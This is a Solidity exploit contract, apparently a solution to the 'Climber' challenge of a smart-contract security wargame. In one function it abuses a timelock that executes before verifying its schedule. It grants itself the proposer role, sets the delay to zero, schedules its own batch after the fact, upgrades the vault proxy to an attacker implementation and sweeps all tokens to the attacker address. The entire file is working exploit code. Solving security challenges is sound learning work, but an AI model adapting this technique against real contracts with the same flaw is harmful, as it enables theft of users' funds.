// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./AttackerNewClimberVault.sol";

contract ClimberAttacker {
    ClimberTimelock private timelock;
    address private vault;
    address private attacker;
    address private token;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt = keccak256("Attack");

    constructor(
        address payable _timelock,
        address _vault,
        address _attacker,
        address _token
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = payable(_vault);
        attacker = payable(_attacker);
        token = _token;
    }

    function Attack() external {
        require(msg.sender == attacker, "Only attacker allowed");

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        AttackerNewClimberVault NewClimberVault = new AttackerNewClimberVault();

        dataElements.push(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(NewClimberVault)
            )
        );
        values.push(0);
        targets.push(address(vault));

        dataElements.push(
            abi.encodeWithSignature("setSweeper(address)", address(this))
        );
        values.push(0);
        targets.push(address(vault));

        timelock.execute(targets, values, dataElements, salt);

        AttackerNewClimberVault Attackervault = AttackerNewClimberVault(vault);
        Attackervault.sweepFunds(token);
        IERC20(token).transfer(
            attacker,
            IERC20(token).balanceOf(address(this))
        );
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
